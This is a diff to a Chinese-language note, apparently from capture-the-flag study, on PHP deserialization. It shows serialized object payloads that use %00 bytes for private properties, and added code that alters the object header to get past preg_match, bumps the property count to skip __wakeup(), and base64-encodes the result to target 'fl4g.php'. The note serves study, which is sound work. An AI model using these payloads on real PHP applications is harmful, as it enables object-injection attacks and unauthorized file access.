@@ -174,7 +174,18 @@ private私有属性的反序列化，需要替换字符（注意：在某些终�
 O:4:"Name":2:{s:14:"口Name口username";s:6:"admine";s:14:"口Name口password";s:3:"100";}
 会有口，改为%00
 O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
+
+如果private需要base64编码的，就在代码里替换并编码
+$C = serialize($a);
+//string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
+$C = str_replace('O:4', 'O:+4',$C);//绕过preg_match
+$C = str_replace(':1:', ':2:',$C);//绕过wakeup
+var_dump($C);
+//string(49) "O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}"
+var_dump(base64_encode($C));
+//string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
 ```
+
 反序列化时绕过__wakeup()方法执行
 ```
 O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
